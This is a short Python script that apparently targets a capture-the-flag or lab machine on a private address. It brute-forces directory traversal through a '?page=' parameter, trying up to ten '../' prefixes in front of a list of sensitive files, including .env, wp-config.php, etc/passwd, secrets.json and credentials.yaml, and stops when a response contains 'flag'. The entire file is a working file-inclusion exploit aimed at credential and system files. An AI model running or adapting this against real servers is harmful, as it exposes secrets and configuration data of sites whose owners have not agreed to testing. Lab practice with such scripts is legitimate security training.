import requests

common_sensitive_files = [
    ".env",
    "config.php",
    "wp-config.php",
    "web.config",
    "appsettings.json",
    "settings.py",
    "database.yml",
    "etc/passwd",
    "secrets.json",
    "credentials.yaml",
    "config.ini",
]

BASE_URL = "http://192.168.38.130/?page="

def check_file(filename, max_depth=10):
    for depth in range(max_depth + 1):
        traversal = "../" * depth + filename
        url = f"{BASE_URL}{traversal}"
        print(f"Checking URL: {url}")
        try:
            response = requests.get(url, timeout=5)
            if "flag" in response.text:
                print(f"Found 'flag' in response for: {url}")
                return True
        except Exception as e:
            print(f"Error requesting {url}: {e}")

def main():
    for sensitive_file in common_sensitive_files:
        if (check_file(sensitive_file)):
            break

if __name__ == "__main__":
    main()